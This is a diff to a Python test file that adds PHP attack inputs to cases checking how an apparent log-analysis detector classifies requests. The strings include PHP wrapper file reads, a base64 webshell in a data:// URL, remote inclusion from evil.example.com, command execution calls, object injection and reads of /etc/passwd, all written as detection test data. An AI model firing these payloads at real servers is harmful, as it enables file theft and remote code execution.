@@ -129,6 +129,36 @@ def test_owasp_mappings_use_the_expected_notation() -> None:
         ("/p?tpl={{file_get_contents('/etc/passwd')}}", ActivityCategory.INJECTION),
         ("/p?name=<%= 7*7 %>", ActivityCategory.INJECTION),
         ("/p?q=#{7*7}", ActivityCategory.INJECTION),
+        # PHP, which had no rule of its own at all — every `php` in the packs
+        # was a filename pattern. Against the CRS corpus family 933 scored
+        # 0.012 over 173 cases, and the two that matched did so through a
+        # reconnaissance rule catching a path. These are the shapes an access
+        # log can actually see: a wrapper or a URL in a parameter the
+        # application is about to include.
+        (
+            "/index.php?page=php://filter/convert.base64-encode/resource=config",
+            ActivityCategory.INJECTION,
+        ),
+        ("/index.php?file=php://input", ActivityCategory.INJECTION),
+        (
+            "/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg==",
+            ActivityCategory.INJECTION,
+        ),
+        ("/index.php?f=phar://uploads/avatar.jpg/x", ActivityCategory.INJECTION),
+        # Remote file inclusion: the parameter is a URL somewhere else.
+        ("/index.php?file=http://evil.example.com/shell.txt", ActivityCategory.INJECTION),
+        # PHP's own execution functions, named in a parameter.
+        ("/p?x=system('id')", ActivityCategory.INJECTION),
+        ("/p?x=shell_exec('whoami')", ActivityCategory.INJECTION),
+        ("/p?x=passthru('ls -la')", ActivityCategory.INJECTION),
+        # A serialised object, which reaches `unserialize` and runs whatever
+        # magic method the class exposes.
+        ('/p?u=O:8:"stdClass":1:{s:3:"cmd";s:2:"id";}', ActivityCategory.INJECTION),
+        # Two command-injection shapes that only matched before because the
+        # payload happened to name /etc/passwd — the file caught them, not the
+        # injection.
+        ("/p?cmd=%0awhoami", ActivityCategory.INJECTION),
+        ("/p?c={id,}", ActivityCategory.INJECTION),
         ("/ping?host=127.0.0.1;cat /etc/passwd", ActivityCategory.PATH_TRAVERSAL),
         ('/api?filter={"$where":"1==1"}', ActivityCategory.INJECTION),
         ("/download?file=../../../../etc/passwd", ActivityCategory.PATH_TRAVERSAL),
